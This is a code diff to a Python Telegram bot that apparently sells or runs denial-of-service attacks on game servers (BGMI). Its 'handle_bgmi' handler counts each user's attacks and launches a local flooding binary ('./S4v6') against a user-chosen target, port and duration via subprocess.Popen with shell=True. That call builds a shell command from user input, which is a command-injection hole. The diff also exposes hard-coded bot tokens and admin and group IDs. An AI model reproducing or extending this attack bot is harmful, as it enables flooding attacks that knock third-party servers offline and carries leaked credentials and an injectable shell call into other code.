@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 # Bot token and admin ID
-bot_token = '7694602747:AAGLCVsIVhrnA4_Myjq9t0MyYVN8lFjKH3A'
+bot_token = '7335844342:AAGAvUNWRjG8aDAaMIHIUbjiyOujdf0HLn4'
 admin_id = '6769245930'  # Replace with your actual admin user ID
 GROUP_ID = '-1002220511003'  # Allowed group ID
 
@@ -146,7 +146,7 @@ def handle_bgmi(message):
     user_last_attack_time[user_id] = current_time
     user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
-    full_command = f"./S42 {target} {port} {attack_time} 100"
+    full_command = f"./S4v6 {target} {port} {attack_time} 10"
     process = subprocess.Popen(full_command, shell=True)
     running_attacks[user_id] = process
 
